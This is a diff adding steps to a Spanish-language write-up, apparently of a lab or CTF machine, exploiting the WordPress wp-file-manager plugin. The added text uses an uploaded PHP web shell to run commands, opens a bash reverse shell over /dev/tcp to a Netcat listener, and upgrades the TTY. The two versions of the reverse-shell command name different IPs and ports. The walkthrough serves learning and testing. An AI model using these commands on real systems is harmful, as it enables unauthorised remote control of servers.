@@ -218,6 +218,8 @@ Para explotar esta vulnerabilidad lo primero que tenems que hacer es crear una s
 ?>
 ```
 
+Esta shell permite indicarle medienta el parámetro "cmd" el comando que se quiere ejecutar.
+
 Una vez tenemos el payload que vamos a subir, mediante curl lo subimos al servidor:
 
 ```bash
@@ -249,3 +251,39 @@ Resultado (relevante):
 Como podemos observar en el JSON, nos indica dónde se ha subido el fichero que hemos indicado. Ahora sólo tenemos que ir a esa url y comprobar que tenemos ejecución remota de comandos:
 
 ![http blog php shell rce](http_blog_php_shell_rce.png)
+
+Como podemos comprobar, al poner en la url de la máquina víctima `http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id` obtenemos el siguiente resultado:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+```
+
+El usuario que está ejectuando el servidor Apache es el usuario www-data. Ahora vamos a intentar crear una reverse shell para poder manejarnos más comodamente.
+
+Para ello, nos ponemos en escucha en nuestra máquina mediante Netcat:
+
+```bash
+nc -nlvp 8888
+```
+
+Rebiendo el mensaje de confirmación de que estamos escuchando:
+
+```text
+listening on [any] 8888 ...
+```
+
+A continuación, a través de la shell que hemos subido al servidor ejecutamos un comando para que nos establezca una conexión a nuestro Netcat (`/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'`). Para ello hacemos un url encode del comando y lo pasamos por el parámetro "cmd" de la url `http://10.0.0.100/blog/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.102/8888%200%3E%261%27` obteniendo el siguiente resultado:
+
+```text
+connect to [10.0.0.102] from (UNKNOWN) [10.0.0.100] 33976
+<ress/wp-content/plugins/wp-file-manager/lib/files$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Ahora, para poder tener una shell completamente interactiva lanzamos una pseudo consola con `script /dev/null -c bash`, presionamos `Ctrl + z` ya hacemos un tratamiento de la tty con `stty raw -echo; fg`. Hacemos `reset` para reiniciar la configuración de la terminal, escribirmos `xterm` como tipo de terminal y exportamos 2 variables de entorno:
+
+* `export TERM=xterm`
+* `export SHELL=bash`
+
+Con esto ya deberíamos poder hacer `Ctrl + c` para terminar la ejecución de un comando, o `Ctrl + l`para limpiar la terminal. También podemos ir atrás en el histórico de comandos.
